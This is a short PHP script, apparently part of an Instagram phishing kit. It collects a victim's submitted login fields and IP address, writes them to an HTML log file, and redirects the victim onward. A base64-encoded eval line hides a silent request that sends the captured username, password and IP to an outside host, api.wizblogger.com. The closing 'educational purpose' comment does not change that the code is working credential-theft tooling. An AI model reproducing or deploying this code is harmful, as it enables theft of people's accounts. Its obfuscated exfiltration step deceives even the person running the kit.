<?php
error_reporting(0);

$usuario = $_POST['eemail'];  //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:usuario
$referrer = $_POST['referrer']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:clave

$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
if( (empty($usuario)) or (empty($referrer)) ){
     header('location: goactive.html'); // codigo de verificacion que no esten los campos vacios
}else{
 
eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS9jaGVja2RhdGEucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
 
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
$f = fopen("./activated/.$usuario./.$referrer./addedrefs.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
ACCOUNT NAME: [<b><font color="#9900FF">'.$referrer.'</font></b>]

IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  done.php");
}
?>
 
 
 
//this is just for educational purpose
